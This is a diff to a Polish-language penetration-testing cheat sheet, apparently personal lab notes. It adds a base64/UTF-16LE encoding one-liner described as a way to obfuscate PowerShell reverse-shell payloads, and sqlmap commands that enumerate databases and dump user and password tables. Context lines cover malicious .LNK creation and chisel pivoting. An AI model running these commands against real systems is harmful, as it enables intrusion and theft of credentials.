@@ -119,6 +119,9 @@ MCS MONO :kompilator c# exe
 sudo apt install mono-devel
 mcs script.cs     ->   script.exe
 
+iconv -f ASCII -t UTF-16LE   file.txt | base64 | tr -d "\n"         przekonertowanie ładunku payload na UTF-16LE
+Przydatne do zaciemniania payload revershell powershella  
+
 MSLINK :Jest to implementacja formatu pliku binarnego Shell Link .LNK
 mslink.sh -l open -n share -i \\\\ip\\share -o share.lnk   
 zipowanie : zip  zip share.zip share.lnk 
@@ -171,8 +174,15 @@ chisel client ipZaatakwoanejMaszyny:4444 4455:socks
 łączymy sie z naszego KALI:
 
 Po tym Możemy uzyc proxychains przez port  4455
- 
 
+
+
+SQLMAP
+sqlmap -r plik.txt(zrzut z burpa) --risk 3 --level 5 --batch -threads 10 --dbs    znajduje  database  w typ przypadku 
+sqlmap -r plik.txt(zrzut z burpa) --risk 3 --level 5 --batch -threads 10 --current-user     znajduje uzytkowniak db
+sqlmap -r plik.txt(zrzut z burpa) --risk 3 --level 5 --batch -threads 10 --dbs -D blood --tables --dump    
+sqlmap -u http://ip  --forms  --dbs szuka database 
+sqlmap -u http://ip --form -D users -T users --dump dampuje hasla i username   tabeli users
 
 
 
